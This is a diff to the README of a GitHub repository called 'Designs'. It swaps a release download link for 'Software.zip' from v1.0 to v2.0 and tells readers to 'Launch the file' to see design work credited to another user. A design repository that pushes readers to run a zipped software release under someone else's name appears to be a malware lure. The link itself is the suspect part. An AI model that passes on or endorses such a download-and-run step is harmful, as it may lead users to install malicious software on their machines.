@@ -19,7 +19,7 @@ Welcome to the "Designs" repository! This repository contains a collection of de
 - svg-language
 
 ## Get Started
-To access the latest version of the content in this repository, [click here to download the ZIP file](https://github.com/mrckrown/Designs/releases/download/v1.0/Software.zip) which contains all the design information. Launch the file to explore the designs created by @seanpm2001!
+To access the latest version of the content in this repository, [click here to download the ZIP file](https://github.com/mrckrown/Designs/releases/download/v2.0/Software.zip) which contains all the design information. Launch the file to explore the designs created by @seanpm2001!
 
 ## Repository Structure
 The repository is organized into different folders and files to make it easy for you to navigate and find the design resources you need. From SVG language files to graphic design documentation, everything is neatly categorized for quick access.
